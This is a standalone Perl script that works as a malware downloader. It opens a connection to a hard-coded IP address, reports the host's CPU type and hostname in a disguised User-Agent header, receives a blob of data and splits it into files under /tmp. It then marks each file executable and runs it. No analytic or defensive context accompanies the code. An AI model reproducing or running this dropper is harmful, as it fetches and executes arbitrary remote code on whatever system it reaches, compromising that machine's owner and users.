#!/usr/bin/perl
use IO::Socket;
my $ip="94.102.60.106",$answer="";
my $runtype=typeofrun;

sub trim($)
{
	my $string = shift;
	$string =~ s/\r//;
	$string =~ s/\n//;
	return $string;
}

my $socket=IO::Socket::INET->new(PeerAddr=>"$ip",PeerPort=>"80",Proto=>"tcp") or return;
print $socket "GET /cgi-bin/generator.pl HTTP/1.0\r\nUser-Agent: ".trim(`uname -p`).";$runtype;7777;".trim(`hostname`).";\r\n\r\n";

while(<$socket>){ $answer.=$_;}
close($socket);

my $data=substr($answer,index($answer,"\r\n\r\n")+4);
if($answer=~/Time: (.*)\r\n/)
{
    my $cpos=0,@pos=split(/ /,$1);
    foreach(@pos)
    {
	my $file="/tmp/".$_;
	
        open(FILE,">".$file);
	print FILE substr($data,$cpos,$_);
	close(FILE);
	
	chmod 0755, $file;
	system($file);
	
        $cpos+=$_;
    }
}

